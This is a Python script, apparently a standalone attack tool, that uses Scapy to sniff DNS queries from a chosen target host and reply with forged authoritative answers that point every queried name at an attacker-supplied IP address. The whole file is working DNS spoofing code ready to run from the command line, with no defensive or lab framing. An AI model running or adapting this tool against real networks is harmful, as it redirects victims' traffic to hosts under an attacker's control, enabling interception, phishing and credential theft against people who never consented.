import sys
from scapy.all import sniff, send
from scapy.layers.inet import UDP, IP
from typing import Tuple
import argparse
from scapy.layers.dns import DNS, DNSQR, DNSRR


def process_args() -> Tuple[str, str]:
    parser = argparse.ArgumentParser()
    parser.add_argument('target', help='Specify target address')
    parser.add_argument('spoof_ip', help='Specify spoofed address')
    args = parser.parse_args()
    return args.target, args.spoof_ip


def spoof_packets(packet, spoof_ip: str):
    ip = IP(dst=packet[IP].src, src=packet[IP].dst)
    udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
    rr = DNSRR(rrname=packet[DNS].qd.name, ttl=10, rdata=spoof_ip)
    dns = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=rr)
    pkt = ip / udp / dns
    try:
        send(pkt, verbose=0)
    except (OSError, PermissionError) as e:
        print(f"{e}")
        sys.exit()


def sniff_init(target: str, spoof_ip: str):
    try:
        sniff(filter="udp and port 53 and host " + target, prn=lambda p: spoof_packets(p, spoof_ip), store=False)
    except PermissionError:
        sys.exit("Permission error! Run as sudo or admin!")


def main():
    target, spoof_ip = process_args()
    print(target, spoof_ip)
    sniff_init(target, spoof_ip)


if __name__ == "__main__":
    main()
